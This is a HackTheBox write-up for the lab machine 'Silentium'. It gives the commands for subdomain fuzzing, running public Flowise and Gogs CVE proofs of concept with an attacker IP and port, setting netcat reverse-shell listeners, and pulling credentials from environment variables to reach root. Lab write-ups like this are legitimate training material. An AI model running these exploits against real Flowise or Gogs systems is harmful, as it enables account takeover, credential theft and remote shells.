+++ 
draft = false
date = 2026-04-23T16:33:12+02:00
title = "HackTheBox Silentium Writeup"
description = "A walkthrough for the HTB \"Silentium\" machine"
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="./files/title.png" alt="">}}

Good evening, today we'll be tackling the "Silentium" HackTheBox machine.

# Basic reconnaissance

As with many other Easy-Linux machines, a port-scan will reveal SSH and HTTP services present inside the box, and trying to access the HTTP service itself we'll be able to find a static-HTML webpage:

{{<betterfigure src="./files/web.png" alt="">}}

As you're probably thinking already, there is nothing useful we can gather from this page, so we'll perform a subdomain scan using the following command:

```bash
ffuf -r -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -p 0.1 -fs 8753
```

> `-fs 8753` specifies filtering out response sizes of the set number, modify the number for any other websites.

{{<betterfigure src="./files/subscan.png" alt="">}}

As you can see, `staging.silentium.htb` is a valid domain, so we can go ahead and add it to our `/etc/hosts` file before accessing it:

{{<betterfigure src="./files/staging.png" alt="">}}

The login portal seems to be ran by software called Flowise, apart from that there's not much else we can gather like a version number.

# Gaining a foothold

Since we couldn't find any version information regarding the login portal, we have to blindly search for vulnerabilities, one good place to start would be through `searchsploit` as can be seen in the following screenshot:

{{<betterfigure src="./files/searchsploit.png" alt="">}}

While we can use the scripts provided by `searchsploit`, in this guide we'll be using the [following Proof-of-Concept](https://github.com/AzureADTrent/CVE-2025-58434-59528), **however, there is a problem with this vulnerability**.

If you took the time to read the vulnerability report from the repository, you'll notice that this exploit requires the attacker to know a valid email account registered inside the Flowise instance, we could attempt to brute-force it, but there is a much easier solution hiding in plain sight:

{{<betterfigure src="./files/users.png" alt="">}}

Inside the static-HTML page we visited earlier, we can find a list of high-profile employees, with one of them, "Ben", seemingly having a systems administration-adjacent role in the company.

With this, we can try executing the exploit under the assumption that Ben registered his account as `ben@silentium.htb`:

```bash
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528
cd CVE-2025-58434-59528/
python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb 
```

The script will inform us that it has managed to change the password of the account to `Pwn3d!2026`, and to continue the script, we'll have to log in manually and retrieve the same account's API key, so we'll access `staging.silentium.htb` once again and try logging in with the generated credentials:

{{<betterfigure src="./files/manualstep.png" alt="">}}

As you'll be able to see, we managed to access the administrator's account, from here we'll have to access the highlighted API configuration button:

{{<betterfigure src="./files/flowise.png" alt="">}}

Once inside, we'll copy and paste the API key inside the text prompt from the script.

{{<betterfigure src="./files/apikey.png" alt="">}}

Alongside the API key, we'll also have to provide our attacking machine's IP and listening port, so we'll prepare in a separate terminal a reverse shell with the following command:

```bash
nc -lvnp 1337
```

{{<betterfigure src="./files/flowisexploit.png" alt="">}}

Once the exploit has been executed, we'll see that we have indeed gained access to the machine thanks to the reverse shell, however, upon closer inspection, **you'll notice that this isn't the real machine, but rather a Docker container** as evidenced by the existence of the `.dockerenv` file at the root of the filesystem.

{{<betterfigure src="./files/revshell.png" alt="">}}

Despite this, Docker containers tend to store sensitive information that we can leverage against the real machine, such as for example credentials inside environment variables:

{{<betterfigure src="./files/creds.png" alt="">}}

From the screenshot, we can deduce that the censored password could also belong to Ben, so we can try using it to log into the SSH server.

{{<betterfigure src="./files/user.png" alt="">}}

Finally, thanks to the credentials, we manage to retrieve the `user.txt` flag from the machine.

# PrivEsc

Once inside the machine, we can begin looking for potential vulnerabilities to escalate our privileges, if you look far enough, you may notice the `/opt/gogs` folder which is a currently running Git server.

{{<betterfigure src="./files/gogsver.png" alt="">}}

Checking its executable for the running version, we can look it up on any search engine and find out that **it's vulnerable to [CVE-2025-8110](https://github.com/0dgt/CVE-2025-8110)**, however, the exploit requires an accessible account, and trying the same credentials used for Flowise will not work again.

To fix this, we'll use port forwarding to access the Gogs instance ourselves and register an account:

```bash
ssh ben@silentium.htb -L 3001:localhost:3001
```

{{<betterfigure src="./files/gogs.png" alt="">}}

With the account created, we can now open another port with `nc -lvnp 1302` to receive the reverse shell with, and execute the following commands:

```bash
git clone https://github.com/0dgt/CVE-2025-8110
cd CVE-2025-8110/
python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.15.106 -lp 1302
```

{{<betterfigure src="./files/root.png" alt="">}}

After executing the exploit, we receive access to the server's `root` account, therefore completing the machine as we retrieve the `root.txt` flag.
